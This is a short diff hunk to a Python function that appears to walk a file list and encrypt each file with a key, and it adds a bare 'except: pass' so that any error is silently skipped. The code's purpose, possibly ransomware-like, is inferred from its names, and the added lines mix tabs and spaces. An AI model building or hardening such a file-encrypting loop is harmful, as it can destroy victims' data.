@@ -56,3 +56,5 @@ def filelist():
                             file_ecrypt(key, ally)
                     except PermissionError:
                         pass
+		    except:
+			pass
